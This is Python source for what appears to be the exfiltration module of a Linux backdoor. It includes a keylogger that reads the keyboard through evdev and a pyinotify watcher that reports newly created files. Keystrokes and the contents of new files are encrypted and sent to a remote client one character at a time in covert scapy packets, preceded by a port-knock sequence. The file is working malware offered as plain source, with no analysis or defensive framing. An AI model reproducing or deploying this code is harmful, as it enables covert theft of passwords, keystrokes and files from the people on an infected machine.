from evdev import InputDevice, categorize, ecodes, list_devices
import pyinotify
import socket
from subprocess import Popen, PIPE
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from struct import *
import sys
import os
import threading
import pcapy
import config
import recvFunctions
import backjake
import utils
import exfil

client = ""
string = ""
protocol = ""
logger = False

scancodes = {
    # Scancode: ASCIICode
    0: None, 1: u'[ESC]', 2: u'1', 3: u'2', 4: u'3', 5: u'4', 6: u'5', 7: u'6', 8: u'7', 9: u'8',
    10: u'9', 11: u'0', 12: u'-', 13: u'=', 14: u'[BKSP]', 15: u'TAB', 16: u'Q', 17: u'W', 18: u'E', 19: u'R',
    20: u'T', 21: u'Y', 22: u'U', 23: u'I', 24: u'O', 25: u'P', 26: u'[', 27: u']', 28: u'[CRLF]', 29: u'[LCTRL]',
    30: u'A', 31: u'S', 32: u'D', 33: u'F', 34: u'G', 35: u'H', 36: u'J', 37: u'K', 38: u'L', 39: u';',
    40: u'"', 41: u'`', 42: u'[LSHFT]', 43: u'\\', 44: u'Z', 45: u'X', 46: u'C', 47: u'V', 48: u'B', 49: u'N',
    50: u'M', 51: u',', 52: u'.', 53: u'/', 54: u'[RSHFT]', 56: u'[LALT]', 57: u' ', 100: u'[RALT]'
}

class EventHandler(pyinotify.ProcessEvent):
	def process_IN_CREATE(self, event):
		global string
		isFile = os.path.isfile(event.pathname)
		if isFile:
			string = "Created file: " + event.pathname + " Contents: "
		else:
			string = "Created Directory: " + event.pathname
		sendMessage(string)
		string = ""

		if isFile:
			sendFile(event.pathname)

	def process_IN_DELETE(self, event):
		global string
		sendMessage(string)
		string = "Deleted: " + event.pathname

mask = pyinotify.IN_DELETE | pyinotify.IN_CREATE
handler = EventHandler()
wama = pyinotify.WatchManager()
noti = pyinotify.Notifier(wama, handler)	

def addWatch(target, address, proto):
	global client, protocol
	client = address
	protocol = proto

	if (wama.add_watch(target, mask, rec=True) > 0):
		print "added: " + target

def sendMessage(string):
	recvFunctions.knockCode(client, protocol, True)

	string = utils.encryptData(string)
	for c in string:
		send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)

	recvFunctions.knockCode(client, protocol, False)

def removeWatch(target):
	if (wama.rm_watch(wama.get_wd(target))):
		print "removed: " + target

def sendFile(target):
	recvFunctions.knockCode(client, protocol, True)

	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)
	with open(target, 'r') as f:
		while True:
			c = f.read(1)
			if not c:
				break
			c = utils.encryptData(c)
			send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)

	recvFunctions.knockCode(client, protocol, False)

def exfilThread():
	noti.loop()

def startThread(): # address, protocol, password):
	listenThread = threading.Thread(target=exfilThread)#, args=(address, protocol))
	listenThread.daemon = True
	listenThread.start()

def startKeylogger(address, proto):
	global logger
	global logThread
	global client, protocol
	client = address
	protocol = proto

	if not logger:
		logThread = threading.Thread(target=startKeylistener)
		logThread.daemon = True
		logThread.start()
		logger = True
	else:
		logger = False

def findKeyboard():
	devices = [InputDevice(fn) for fn in list_devices()]
	for dev in devices:
		if "keyboard" in dev.name.lower():
			return dev.fn 

def startKeylistener():
	global logger
	dev = InputDevice(findKeyboard())
	for event in dev.read_loop():
		if logger:
			if event.type == ecodes.EV_KEY:
				temp = categorize(event)
				if temp.keystate == 1:
					key_lookup = scancodes.get(temp.scancode)
					sendMessage(format(key_lookup))
		else:
			thread.exit()
